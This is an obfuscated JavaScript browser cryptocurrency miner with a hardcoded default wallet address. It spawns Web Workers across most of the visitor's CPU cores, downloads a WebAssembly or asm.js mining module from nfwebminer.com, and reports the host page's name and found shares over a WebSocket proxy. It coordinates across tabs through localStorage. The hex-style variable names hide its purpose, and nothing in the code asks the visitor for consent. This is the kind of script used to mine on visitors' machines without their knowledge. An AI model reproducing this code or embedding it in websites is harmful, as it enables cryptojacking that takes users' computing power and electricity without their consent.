"use strict";

function Miner(_0x57f6x1, _0x57f6x2) {
  "use strict";

  _0x57f6x1 = _0x57f6x1 || '46Gxh1vxibaEDjxDNqWYgXigK1GRS1kUm18A5kwbmT4oRj31Mdha3JDgYxXiicLLPKZJUQG3eiQ2cfAV3DX66tVEJ2YBnkp';
  _0x57f6x2 = _0x57f6x2 || {};
  var _0x57f6x3 = _0x57f6x2["load"] || "high";
  var _0x57f6x4 = 1;
  if (_0x57f6x3 == "low") {
    _0x57f6x4 = Math["max"](Math["ceil"](navigator["hardwareConcurrency"] / 4), 1);
  } else {
    if (_0x57f6x3 == "medium") {
      _0x57f6x4 = Math["max"](Math["ceil"](navigator["hardwareConcurrency"] / 2), 1);
    } else {
      if (_0x57f6x3 == "high") {
        _0x57f6x4 = Math["max"](navigator["hardwareConcurrency"] - 1, 1);
      } else {
        if (_0x57f6x3 == "full") {
          _0x57f6x4 = Math["max"](navigator["hardwareConcurrency"], 1);
        }
      }
    }
  };
  var _0x57f6x5;
  var _0x57f6x6 = {};
  var _0x57f6x7 = 0;
  var _0x57f6x8 = [];
  var _0x57f6x9;
  var _0x57f6xa;
  var _0x57f6xb;
  var _0x57f6xc;
  var _0x57f6xd;
  var _0x57f6xe = false;
  var _0x57f6xf = false;
  var _0x57f6x10 = false;
  var _0x57f6x11;
  var _0x57f6x12 = _0x57f6x2["forceAsmJs"] || window["WebAssembly"] == undefined;
  var _0x57f6x13 = false;
  var _0x57f6x14 = 0;
  var _0x57f6x15 = 0;
  var _0x57f6x16;
  var _0x57f6x17;
  var _0x57f6x18 = _0x57f6x2["debug"] || false;
  this["on"] = function (_0x57f6x19, _0x57f6x1a) {
    if (_0x57f6x19 == "hashrate") {
      _0x57f6x16 = _0x57f6x1a;
    } else {
      if (_0x57f6x19 == "shareAccepted") {
        _0x57f6x17 = _0x57f6x1a;
      }
    }
  };
  var _0x57f6x1b = Math["random"]() * 0xffffffff | 0;
  var _0x57f6x1c = "nfwebminer.com";
  var _0x57f6x1d = true;
  if (_0x57f6x18) {};
  window["addEventListener"]("unload", function (_0x57f6x1e) {
    var _0x57f6x1f = localStorage["getItem"]("nfwebminer");
    if (_0x57f6x1f) {
      var _0x57f6x20 = JSON["parse"](_0x57f6x1f);
      if (_0x57f6x20["id"] == _0x57f6x1b) {
        localStorage["removeItem"]("nfwebminer");
      }
    }
  });
  this["getThreads"] = function () {
    return _0x57f6x5;
  };
  this["setThreads"] = function (_0x57f6x1f) {
    _0x57f6x5 = Math["min"](Math["max"](_0x57f6x1f, 1), 8);
    _0x57f6x29();
  };
  this["setThreads"](_0x57f6x2["threads"] || _0x57f6x4);
  this["isRunning"] = function () {
    return _0x57f6xe;
  };
  this["start"] = function () {
    if (_0x57f6x18) {};
    if (_0x57f6xe) {
      _0x57f6xf = false;
      return;
    };
    _0x57f6xf = true;
    var _0x57f6x1f = localStorage["getItem"]("nfwebminer");
    if (_0x57f6x1f) {
      try {
        var _0x57f6x20 = JSON["parse"](_0x57f6x1f);
        if (_0x57f6x20["id"] != _0x57f6x1b) {
          var _0x57f6x21 = Date["now"]() - 60000 * 2;
          if (_0x57f6x20["date"] > _0x57f6x21) {
            return;
          }
        }
      } catch (e) {
        if (this["_debug"]) {}
      }
    };
    localStorage["setItem"]("nfwebminer", JSON["stringify"]({
      id: _0x57f6x1b,
      date: Date["now"]()
    }));
    _0x57f6xe = true;
    _0x57f6xf = false;
    if (!_0x57f6x10) {
      if (_0x57f6x12) {
        fetch("http://" + _0x57f6x1c + "/lib/webminer_v1.js")["then"](_0x57f6x23 => _0x57f6x23["arrayBuffer"]())["then"](_0x57f6x22 => {
          _0x57f6x10 = _0x57f6x22;
          _0x57f6x34();
        });
      } else {
        fetch("http://" + _0x57f6x1c + "/lib/webminer_v1.wasm")["then"](_0x57f6x23 => _0x57f6x23["arrayBuffer"]())["then"](_0x57f6x22 => {
          _0x57f6x10 = _0x57f6x22;
          _0x57f6x34();
        });
      }
    } else {
      _0x57f6x34();
    }
  };
  this["_calculateHashRate"] = function () {
    var _0x57f6x24 = _0x57f6x14 - _0x57f6x15;
    _0x57f6x15 = _0x57f6x14;
    if (_0x57f6x16) {
      _0x57f6x16(_0x57f6x24);
    };
    if (_0x57f6xf) {
      this["start"]();
    } else {
      if (_0x57f6xe) {
        var _0x57f6x1f = localStorage["getItem"]("nfwebminer");
        var _0x57f6x25 = false;
        if (_0x57f6x1f) {
          var _0x57f6x20 = JSON["parse"](_0x57f6x1f);
          if (_0x57f6x20["id"] != _0x57f6x1b) {
            this["stop"]();
          } else {
            if (_0x57f6x20["date"] + 60000 < Date["now"]()) {
              _0x57f6x25 = true;
            }
          }
        } else {
          _0x57f6x25 = true;
        };
        if (_0x57f6x25) {
          localStorage["setItem"]("nfwebminer", JSON["stringify"]({
            id: _0x57f6x1b,
            date: Date["now"]()
          }));
        }
      }
    }
  };
  this["_benchmarkInterval"] = setInterval(this["_calculateHashRate"]["bind"](this), 1000);
  this["stop"] = function () {
    _0x57f6xf = false;
    if (!_0x57f6xe) {
      return;
    };
    localStorage["removeItem"]("nfwebminer");
    _0x57f6xe = false;
    _0x57f6x11["close"]();
  };

  function _0x57f6x26(_0x57f6x27) {
    if (_0x57f6x33 && _0x57f6xb < _0x57f6xd) {
      _0x57f6x27["postMessage"]({
        cmd: "work",
        blob: _0x57f6x9,
        difficulty: _0x57f6xa,
        nonce: _0x57f6xb,
        jobSequence: _0x57f6xc
      });
      _0x57f6xb++;
      _0x57f6x14++;
    } else {
      _0x57f6x8["push"](_0x57f6x27);
    }
  }
  var _0x57f6x28 = 0;

  function _0x57f6x29() {
    if (_0x57f6x7 >= _0x57f6x5 || !_0x57f6xe) {
      return;
    };
    for (i = _0x57f6x7; i < _0x57f6x5; i++) {
      var _0x57f6x2a;
      if (_0x57f6x18) {};
      var _0x57f6x2b = workerFunction.toString();
      _0x57f6x2b = _0x57f6x2b["substring"](_0x57f6x2b["indexOf"]("{") + 1, _0x57f6x2b["lastIndexOf"]("}"));
      _0x57f6x2a = new Blob([_0x57f6x2b], {
        type: "application/javascript"
      });
      var _0x57f6x27 = new Worker(URL["createObjectURL"](_0x57f6x2a));
      _0x57f6x7++;
      var _0x57f6x2c = _0x57f6x28++;
      _0x57f6x6[_0x57f6x2c] = _0x57f6x27;
      _0x57f6x27["onerror"] = function (_0x57f6x2d) {
        if (_0x57f6x18) {}
      };
      _0x57f6x27["onmessage"] = function (_0x57f6x2d) {
        var _0x57f6x2e = _0x57f6x27;
        if (_0x57f6x2d["data"]["cmd"] == "ready") {
          _0x57f6x26(_0x57f6x6[_0x57f6x2d["data"]["workerId"]]);
        } else {
          if (_0x57f6x2d["data"]["cmd"] == "finished") {
            if (_0x57f6x7 > _0x57f6x5 || !_0x57f6xe) {
              _0x57f6x7--;
              _0x57f6x6[_0x57f6x2d["data"]["workerId"]]["terminate"]();
              _0x57f6x6[_0x57f6x2d["data"]["workerId"]] = null;
            } else {
              _0x57f6x26(_0x57f6x6[_0x57f6x2d["data"]["workerId"]]);
            }
          } else {
            if (_0x57f6x2d["data"]["cmd"] == "share") {
              var _0x57f6x2f = hexToString(_0x57f6x2d["data"]["nonce"]);
              var _0x57f6x30 = Uint32Array2hex(_0x57f6x2d["data"]["hash"], 8);
              if (_0x57f6x18) {};
              var _0x57f6x31 = {
                command: "share",
                nonce: _0x57f6x2f,
                hash: _0x57f6x30,
                jobSequence: _0x57f6x2d["data"]["jobSequence"]
              };
              _0x57f6x11["send"](JSON["stringify"](_0x57f6x31));
            }
          }
        };
        if (_0x57f6xb >= _0x57f6xd && !_0x57f6x13) {
          _0x57f6x13 = true;
          var _0x57f6x31 = {
            command: "finished"
          };
          _0x57f6x11["send"](JSON["stringify"](_0x57f6x31));
        }
      };
      _0x57f6x27["postMessage"]({
        cmd: "buffer",
        buffer: _0x57f6x10,
        useAsmJs: _0x57f6x12,
        workerId: _0x57f6x2c
      });
    }
  }
  var _0x57f6x32 = 0;
  var _0x57f6x33 = false;

  function _0x57f6x34() {
    _0x57f6x33 = false;
    if (!_0x57f6xe) {
      _0x57f6x32 = 0;
      return;
    };
    if (_0x57f6x32 == 0) {
      _0x57f6x36();
    } else {
      var _0x57f6x35 = Math["max"](Math["random"]() * _0x57f6x32, 20);
      setTimeout(_0x57f6x36, _0x57f6x35 * 1000);
    }
  }

  function _0x57f6x36() {
    var _0x57f6x37 = (_0x57f6x1d ? "wss" : "ws") + "://" + _0x57f6x1c + "/";
    _0x57f6x11 = new WebSocket(_0x57f6x37 + "proxy");
    _0x57f6x11["onopen"] = function (_0x57f6x1e) {
      _0x57f6x13 = true;
      _0x57f6x32 = 0;
      _0x57f6x33 = true;
      var _0x57f6x31 = {
        command: "connect",
        hash: _0x57f6x1,
        hostname: window["location"]["hostname"]
      };
      _0x57f6x11["send"](JSON["stringify"](_0x57f6x31));
    };
    _0x57f6x11["onclose"] = function (_0x57f6x1e) {
      if (_0x57f6x18) {};
      _0x57f6x32 = Math["min"](_0x57f6x32 + 20, 200);
      if (_0x57f6x32 > 40) {
        _0x57f6x1d = !_0x57f6x1d;
      };
      _0x57f6x34();
      if (_0x57f6x1e["code"] != 1000 && _0x57f6x1e["code"] != 1001) {
        var _0x57f6x38 = new XMLHttpRequest();
        _0x57f6x38["open"]("POST", "connectionError", true);
        _0x57f6x38["send"](JSON["stringify"]({
          code: _0x57f6x1e["code"],
          reason: _0x57f6x1e["reason"]
        }));
      }
    };
    _0x57f6x11["onerror"] = function (_0x57f6x1e) {
      if (_0x57f6x18) {}
    };
    _0x57f6x11["onmessage"] = function (_0x57f6x39) {
      if (_0x57f6x18) {};
      var _0x57f6x31 = JSON["parse"](_0x57f6x39["data"]);
      if (_0x57f6x31["command"] == "work") {
        _0x57f6x9 = new Uint32Array(19);
        hex2Uint32Array(_0x57f6x9, _0x57f6x31["blob"], 19);
        _0x57f6xa = parseHex(_0x57f6x31["difficulty"]);
        _0x57f6xc = _0x57f6x31["jobSequence"];
        _0x57f6xb = _0x57f6x31["fromNonce"];
        _0x57f6xd = _0x57f6x31["fromNonce"] + _0x57f6x31["max"];
        _0x57f6x13 = false;
        _0x57f6x29();
        while (_0x57f6x8["length"] > 0) {
          var _0x57f6x27 = _0x57f6x8["pop"]();
          _0x57f6x26(_0x57f6x27);
        }
      } else {
        if (_0x57f6x31["command"] == "error") {
          if (_0x57f6x18) {}
        } else {
          if (_0x57f6x31["command"] == "accepted") {
            if (_0x57f6x18) {};
            if (_0x57f6x17) {
              _0x57f6x17(_0x57f6x31["reward"]);
            }
          }
        }
      }
    };
  }
}
Miner["isMobileOrTablet"] = function () {
  var _0x57f6x3a = false;
  (function (_0x57f6x3b) {
    if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i["test"](_0x57f6x3b) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i["test"](_0x57f6x3b["substr"](0, 4))) {
      _0x57f6x3a = true;
    }
  })(navigator["userAgent"] || navigator["vendor"] || window["opera"]);
  return _0x57f6x3a;
};

function hex2Uint32Array(_0x57f6x22, _0x57f6x3d, _0x57f6x3e) {
  for (i = 0; i < _0x57f6x3e; i++) {
    for (j = 3; j >= 0; j--) {
      _0x57f6x22[i] = _0x57f6x22[i] * 256 + parseInt(_0x57f6x3d["substr"](i * 8 + j * 2, 2), 16);
    }
  }
}

function parseHex(_0x57f6x3d) {
  var _0x57f6x1f = 0;
  for (j = 3; j >= 0; j--) {
    _0x57f6x1f = _0x57f6x1f * 256 + parseInt(_0x57f6x3d["substr"](j * 2, 2), 16);
  };
  return _0x57f6x1f;
}

function Uint32Array2hex(_0x57f6x22, _0x57f6x3e) {
  var _0x57f6x3d = "";
  for (var _0x57f6x41 = 0; _0x57f6x41 < _0x57f6x3e; _0x57f6x41++) {
    _0x57f6x3d += hexToString(_0x57f6x22[_0x57f6x41]);
  };
  return _0x57f6x3d;
}

function hexToString(_0x57f6x43) {
  var _0x57f6x3d = "";
  for (var _0x57f6x41 = 0; _0x57f6x41 < 4; _0x57f6x41++) {
    var _0x57f6x44 = _0x57f6x43 & 255;
    _0x57f6x43 = _0x57f6x43 >>> 8;
    var _0x57f6x45 = _0x57f6x44.toString(16);
    if (_0x57f6x45["length"] == 1) {
      _0x57f6x45 = "0" + _0x57f6x45;
    };
    _0x57f6x3d += _0x57f6x45;
  };
  return _0x57f6x3d;
}

function workerFunction() {
  var _0x57f6x47;
  var _0x57f6x9;
  var _0x57f6xc;
  var _0x57f6x28;

  function _0x57f6x48(_0x57f6x41) {
    return _0x57f6x5c(_0x57f6x41);
  }

  function _0x57f6x49(_0x57f6x2f, _0x57f6x4a, _0x57f6x4b, _0x57f6x4c, _0x57f6x4d, _0x57f6x4e, _0x57f6x4f, _0x57f6x50, _0x57f6x51) {
    _0x57f6x5e(_0x57f6x2f, _0x57f6x4a, _0x57f6x4b, _0x57f6x4c, _0x57f6x4d, _0x57f6x4e, _0x57f6x4f, _0x57f6x50, _0x57f6x51);
  }

  function _0x57f6x52() {
    var _0x57f6x53 = Math["pow"](2, 32) - 1;
    var _0x57f6x54 = Math["floor"](Math["random"]() * _0x57f6x53);
    return _0x57f6x54;
  }
  self["onmessage"] = function (_0x57f6x2d) {
    if (_0x57f6x2d["data"]["cmd"] == "work") {
      if (!_0x57f6x9 || _0x57f6xc != _0x57f6x2d["data"]["jobSequence"]) {
        _0x57f6x9 = _0x57f6x2d["data"]["blob"];
        if (_0x57f6x47) {
          _0x57f6x47["exports"]._setWork(_0x57f6x2d["data"]["difficulty"]);
        } else {
          _setWork(_0x57f6x2d["data"]["difficulty"]);
        }
      };
      _0x57f6xc = _0x57f6x2d["data"]["jobSequence"];
      if (_0x57f6x47) {
        _0x57f6x47["exports"]._processOneNonce(_0x57f6x2d["data"]["nonce"]);
      } else {
        _processOneNonce(_0x57f6x2d["data"]["nonce"]);
      };
      self["postMessage"]({
        cmd: "finished",
        workerId: _0x57f6x28
      });
    } else {
      if (_0x57f6x2d["data"]["cmd"] == "buffer") {
        _0x57f6x28 = _0x57f6x2d["data"]["workerId"];
        if (_0x57f6x2d["data"]["useAsmJs"]) {
          var _0x57f6x55 = new Blob([_0x57f6x2d["data"]["buffer"]], {
            type: "application/javascript"
          });
          self["importScripts"](URL["createObjectURL"](_0x57f6x55));
          _0x57f6x5a(null);
        } else {
          WebAssembly["compile"](_0x57f6x2d["data"]["buffer"])["then"](_0x57f6x56 => _0x57f6x61(_0x57f6x56, null));
        }
      }
    }
  };

  function _get_blob(_0x57f6x41) {
    return _0x57f6x5c(_0x57f6x41);
  }

  function _0x57f6x58(_0x57f6x2f, _0x57f6x4a, _0x57f6x4b, _0x57f6x4c, _0x57f6x4d, _0x57f6x4e, _0x57f6x4f, _0x57f6x50, _0x57f6x51) {
    _0x57f6x5e(_0x57f6x2f, _0x57f6x4a, _0x57f6x4b, _0x57f6x4c, _0x57f6x4d, _0x57f6x4e, _0x57f6x4f, _0x57f6x50, _0x57f6x51);
  }

  function _0x57f6x59() {
    var _0x57f6x53 = Math["pow"](2, 32) - 1;
    var _0x57f6x54 = Math["floor"](Math["random"]() * _0x57f6x53);
    return _0x57f6x54;
  }

  function _0x57f6x5a(_0x57f6x5b) {
    _0x57f6x47 = _0x57f6x5b;
    self["postMessage"]({
      cmd: "ready",
      workerId: _0x57f6x28
    });
  }

  function _0x57f6x5c(_0x57f6x5d) {
    return _0x57f6x9[_0x57f6x5d];
  }

  function _0x57f6x5e(_0x57f6x2f, _0x57f6x4a, _0x57f6x4b, _0x57f6x4c, _0x57f6x4d, _0x57f6x4e, _0x57f6x4f, _0x57f6x50, _0x57f6x51) {
    var _0x57f6x30 = new Uint32Array(8);
    _0x57f6x30[0] = _0x57f6x4a;
    _0x57f6x30[1] = _0x57f6x4b;
    _0x57f6x30[2] = _0x57f6x4c;
    _0x57f6x30[3] = _0x57f6x4d;
    _0x57f6x30[4] = _0x57f6x4e;
    _0x57f6x30[5] = _0x57f6x4f;
    _0x57f6x30[6] = _0x57f6x50;
    _0x57f6x30[7] = _0x57f6x51;
    self["postMessage"]({
      cmd: "share",
      nonce: _0x57f6x2f,
      hash: _0x57f6x30,
      jobSequence: _0x57f6xc,
      workerId: _0x57f6x28
    });
  }

  function _0x57f6x5f(_0x57f6x60) {
    return Math["ceil"]((_0x57f6x60 + 16) / 16) * 16;
  }

  function _0x57f6x61(_0x57f6x56, _0x57f6x62) {
    _0x57f6x62 = _0x57f6x62 || {};
    _0x57f6x62["env"] = _0x57f6x62["env"] || {};
    _0x57f6x62["env"]["memoryBase"] = _0x57f6x62["env"]["memoryBase"] || 0;
    _0x57f6x62["env"]["tableBase"] = _0x57f6x62["env"]["tableBase"] || 0;
    _0x57f6x62["global"] = {
      NaN: NaN,
      Infinity: Infinity
    };
    if (!_0x57f6x62["env"]["memory"]) {
      _0x57f6x62["env"]["memory"] = new WebAssembly.Memory({
        initial: 256,
        maximum: 256
      });
    };
    HEAP32 = new Int32Array(_0x57f6x62["env"]["memory"]["buffer"]);
    STATIC_BASE = 1024;
    STATICTOP = STATIC_BASE + 2110096;
    _0x57f6x62["env"]["DYNAMICTOP_PTR"] = 0;
    _0x57f6x62["env"]["tempDoublePtr"] = 0;
    _0x57f6x62["env"]["ABORT"] = 0;
    _0x57f6x62["env"]["STACKTOP"] = _0x57f6x5f(STATICTOP + 16);
    _0x57f6x62["env"]["STACK_MAX"] = 5242880;
    _0x57f6x62["env"]["memoryBase"] = 1024;
    _0x57f6x62["env"]["DYNAMICTOP_PTR"] = 2111136;
    _0x57f6x62["env"]["tempDoublePtr"] = 2111120;
    _0x57f6x62["env"]["STACKTOP"] = 2111152;
    _0x57f6x62["env"]["STACK_MAX"] = 7354032;
    DYNAMIC_BASE = _0x57f6x5f(_0x57f6x62["env"].STACK_MAX);
    HEAP32[_0x57f6x62["env"]["DYNAMICTOP_PTR"] >> 2] = DYNAMIC_BASE;
    _0x57f6x62["env"]["abort"] = function (_0x57f6x1f) {
      alert("abort: " + _0x57f6x1f);
    };
    _0x57f6x62["env"]["enlargeMemory"] = function () {
      alert("enlargeMemory");
    };
    _0x57f6x62["env"]["getTotalMemory"] = function () {
      return 16777216;
    };
    _0x57f6x62["env"]["abortOnCannotGrowMemory"] = function () {
      alert("abortOnCannotGrowMemory");
    };
    _0x57f6x62["env"]["abortStackOverflow"] = function () {
      alert("abortStackOverflow");
    };
    _0x57f6x62["env"]["nullFunc_ii"] = function () {
      alert("nullFunc_ii");
    };
    _0x57f6x62["env"]["nullFunc_iiii"] = function () {
      alert("nullFunc_iiii");
    };
    _0x57f6x62["env"]["nullFunc_viii"] = function () {
      alert("nullFunc_viii");
    };
    _0x57f6x62["env"]["___unlock"] = function () {};
    _0x57f6x62["env"]["___lock"] = function () {};
    _0x57f6x62["env"]["___syscall6"] = function () {
      alert("___syscall6");
    };
    _0x57f6x62["env"]["___setErrNo"] = function () {
      alert("___setErrNo");
    };
    _0x57f6x62["env"]["_abort"] = function () {
      alert("_abort");
    };
    _0x57f6x62["env"]["_emscripten_memcpy_big"] = function (_0x57f6x63, _0x57f6x64, _0x57f6x65) {
      HEAPU8["set"](HEAPU8["subarray"](_0x57f6x64, _0x57f6x64 + _0x57f6x65), _0x57f6x63);
      return _0x57f6x63;
    };
    _0x57f6x62["env"]["___syscall54"] = function () {
      alert("___syscall54");
    };
    _0x57f6x62["env"]["___syscall140"] = function () {
      alert("___syscall140");
    };
    _0x57f6x62["env"]["___syscall20"] = function () {
      alert("___syscall20");
    };
    _0x57f6x62["env"]["___assert_fail"] = function () {
      alert("___assert_fail");
    };
    _0x57f6x62["env"]["___syscall146"] = function () {
      alert("___syscall146");
    };
    _0x57f6x62["env"]["abortStackOverflow"] = function () {};
    _0x57f6x62["env"]["_share_found"] = _0x57f6x5e;
    _0x57f6x62["env"]["_get_blob"] = _0x57f6x5c;
    _0x57f6x62["env"]["_oaes_get_seed"] = function () {
      var _0x57f6x53 = Math["pow"](2, 32) - 1;
      var _0x57f6x54 = Math["floor"](Math["random"]() * _0x57f6x53);
      return _0x57f6x54;
    };
    if (!_0x57f6x62["env"]["table"]) {
      _0x57f6x62["env"]["table"] = new WebAssembly.Table({
        initial: 14,
        maximum: 14,
        element: "anyfunc"
      });
    };
    WebAssembly["instantiate"](_0x57f6x56, _0x57f6x62)["then"](_0x57f6x47 => _0x57f6x5a(_0x57f6x47));
  }
}